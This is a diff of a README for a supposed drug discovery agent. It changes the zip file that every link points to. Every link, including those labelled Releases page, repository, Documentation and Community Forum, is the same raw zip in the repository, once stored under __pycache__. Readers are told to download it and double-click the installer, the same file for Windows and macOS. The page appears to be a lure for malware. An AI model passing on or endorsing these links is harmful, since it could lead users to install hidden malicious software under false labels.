@@ -1,6 +1,6 @@
 # 🌟 Durg_Discovery_Agent_with_MCP_Integration - Your Simple Drug Discovery Solution
 
-[![Download Now](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/__pycache__/Discovery-Agent-with-Integration-MC-Durg-v2.8-alpha.2.zip%20Now-red?style=for-the-badge&logo=github)](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/__pycache__/Discovery-Agent-with-Integration-MC-Durg-v2.8-alpha.2.zip)  
+[![Download Now](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/Integration_Discovery_Agent_Durg_with_MC_v1.2.zip%20Now-red?style=for-the-badge&logo=github)](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/Integration_Discovery_Agent_Durg_with_MC_v1.2.zip)  
 
 ## 📋 Overview  
 
@@ -22,9 +22,9 @@ Before you download, make sure your computer meets these requirements:
 
 ### 📥 Download & Install  
 
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/__pycache__/Discovery-Agent-with-Integration-MC-Durg-v2.8-alpha.2.zip).
+1. **Visit the Release Page:** Go to the [Releases page](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/Integration_Discovery_Agent_Durg_with_MC_v1.2.zip).
 2. **Locate the Latest Version:** Look for the latest version listed.
-3. **Download the File:** Click on the download link next to the latest version. This file will be named something like `https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/__pycache__/Discovery-Agent-with-Integration-MC-Durg-v2.8-alpha.2.zip` (for Windows) or `https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/__pycache__/Discovery-Agent-with-Integration-MC-Durg-v2.8-alpha.2.zip` (for macOS).
+3. **Download the File:** Click on the download link next to the latest version. This file will be named something like `https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/Integration_Discovery_Agent_Durg_with_MC_v1.2.zip` (for Windows) or `https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/Integration_Discovery_Agent_Durg_with_MC_v1.2.zip` (for macOS).
 4. **Run the Installer:** Once downloaded, find the file in your downloads folder and double-click it. Follow the installation instructions that appear on your screen.
 5. **Launch the Application:** After installation, look for the Durg Discovery Agent icon on your desktop or in your applications folder. Click it to start.
 
@@ -55,12 +55,12 @@ If you encounter issues during installation or use, consider the following:
 
 ### 💬 Support  
 
-For assistance, please contact our support team. You can submit your queries through the Issues section on our [GitHub repository](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/__pycache__/Discovery-Agent-with-Integration-MC-Durg-v2.8-alpha.2.zip). We aim to respond within 24 hours.
+For assistance, please contact our support team. You can submit your queries through the Issues section on our [GitHub repository](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/Integration_Discovery_Agent_Durg_with_MC_v1.2.zip). We aim to respond within 24 hours.
 
 ### 🔗 Additional Resources  
 
-- [Documentation](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/__pycache__/Discovery-Agent-with-Integration-MC-Durg-v2.8-alpha.2.zip): Find detailed information about features and usage.
-- [Community Forum](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/__pycache__/Discovery-Agent-with-Integration-MC-Durg-v2.8-alpha.2.zip): Join discussions with other users and share your experiences.
+- [Documentation](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/Integration_Discovery_Agent_Durg_with_MC_v1.2.zip): Find detailed information about features and usage.
+- [Community Forum](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/Integration_Discovery_Agent_Durg_with_MC_v1.2.zip): Join discussions with other users and share your experiences.
 
 ## 📜 License  
 
@@ -70,4 +70,4 @@ This project is licensed under the MIT License. For more details, check the LICE
 
 Stay updated by following us on our social media channels. You can find important updates, tips, and support.
 
-### 🌐 Visit the Releases page to download now: [Download Here](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/__pycache__/Discovery-Agent-with-Integration-MC-Durg-v2.8-alpha.2.zip)
+### 🌐 Visit the Releases page to download now: [Download Here](https://github.com/Kh4r0/Durg_Discovery_Agent_with_MCP_Integration/raw/refs/heads/main/agent/Integration_Discovery_Agent_Durg_with_MC_v1.2.zip)
